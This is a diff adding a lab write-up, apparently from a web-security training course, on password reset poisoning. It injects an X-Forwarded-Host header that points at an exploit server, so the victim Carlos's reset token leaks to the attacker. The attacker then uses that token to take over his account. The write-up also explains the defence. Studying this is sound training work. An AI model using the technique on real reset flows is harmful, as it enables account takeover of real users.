@@ -72,3 +72,22 @@
 **Tools:** Burpsuite.
 
 ---
+
+## Category: Password reset poisoning via middleware
+
+**Approach:** Trigger a password reset for `wiener` and send `POST /forgot-password` to Repeater. Plain `Host` header tampering doesn't change the reset link this time — the app sits behind middleware that ignores it.
+
+→ Add a new header `X-Forwarded-Host: <your-exploit-server-id>.exploit-server.net` to the request, keeping the real `Host` header intact.
+
+→ Change `username` to `carlos`. Send the request.
+
+→ Check your exploit server's Access Log for `GET /forgot-password?temp-forgot-password-token=...` — Carlos's token.
+
+→ Swap that token into your own genuine reset link, visit it, set a new password, and log in as `carlos`.
+
+**Why:** Devs hardened against direct `Host` spoofing, but the middleware/reverse proxy still trusted `X-Forwarded-Host` to build the reset link → an attacker-controlled value in that header redirected Carlos's token to the attacker's server → all proxy-forwarding headers (not just `Host`) must be validated or stripped before use in sensitive URLs.
+
+**Tools:** Burpsuite.
+
+
+---
